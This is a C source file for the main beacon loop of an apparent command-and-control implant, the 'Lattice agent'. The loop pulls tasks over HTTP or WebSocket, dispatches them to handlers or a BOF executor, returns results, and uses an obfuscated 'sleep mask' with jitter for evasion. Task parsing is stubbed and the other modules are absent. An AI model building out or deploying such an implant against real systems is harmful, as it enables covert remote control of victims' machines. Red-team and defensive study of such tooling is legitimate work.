// loop.c — main comms loop for the Lattice agent.
//
// The loop is intentionally simple. All complexity lives in the transport,
// sleep_mask, and bof_exec modules that are linked in at build time.
//
// Flow per iteration:
//   1. transport_recv  — pull response (may block on HTTP long-poll / WS recv)
//   2. parse           — decode task envelope from response bytes
//   3. dispatch        — route to builtin handler or bof_exec
//   4. transport_send  — push result
//   5. sleep_mask      — obfuscated sleep (only if can_mask() is true)

#include "lattice_agent.h"

// Minimal CRT-free memset substitute (no libc in PICO builds).
static void *pic_memset(void *s, int c, size_t n) {
    unsigned char *p = (unsigned char *)s;
    while (n--) *p++ = (unsigned char)c;
    return s;
}

void lattice_run(void) {
    for (;;) {
        uint8_t *buf   = NULL;
        size_t   buflen = 0;

        if (transport_recv(&buf, &buflen) < 0) {
            // Transport error: back off and retry.
            // TODO: exponential backoff, dead-agent threshold
            sleep_mask(LATTICE_SLEEP_MS, LATTICE_JITTER_PCT);
            continue;
        }

        // TODO: deserialize protobuf or JSON task envelope from buf/buflen.
        // For now, stub a no-op task.
        lattice_task_t task;
        pic_memset(&task, 0, sizeof(task));

        lattice_result_t result;
        pic_memset(&result, 0, sizeof(result));

        lattice_dispatch(&task, &result);

        transport_send(&result);

        // Only sleep-mask when no AUTONOMOUS BOF is holding the thread awake.
        if (can_mask()) {
            sleep_mask(LATTICE_SLEEP_MS, LATTICE_JITTER_PCT);
        }
    }
}
